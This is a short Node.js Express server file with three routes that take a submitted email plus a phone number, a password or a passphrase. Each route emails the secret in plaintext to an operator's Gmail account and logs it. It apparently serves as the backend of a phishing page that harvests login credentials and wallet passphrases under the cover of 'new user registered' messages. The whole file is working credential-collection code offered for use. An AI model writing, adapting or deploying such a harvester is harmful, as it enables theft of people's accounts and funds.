require("dotenv").config();
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();
const PORT = process.env.PORT || 5000;

// Email credentials from environment variables
const userEmail = process.env.USER_EMAIL;
const pass = process.env.USER_PASS;

app.use(express.json());
app.use(cors());

// API route for index
app.post("/", (req, res) => {
  const { email, phoneNumber } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${email}`,
    to: userEmail,
    subject: `Phone Number: ${phoneNumber}`,
    text: `New user registered with Phone Number: ${phoneNumber}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("Error Occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.send("Success");
    }
  });
});

// API route for password
app.post("/password", (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `PASSWORD: ${password}`,
    text: `New user registered with Password: ${password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("Error Occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.send("Success");
    }
  });
});

// API route for passphrase
app.post("/passphrase", (req, res) => {
  const { email, passphrase } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `PASSPHRASE: ${passphrase}`,
    text: `New user registered with PASSPHRASE: ${passphrase}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("Error Occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.send("Success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
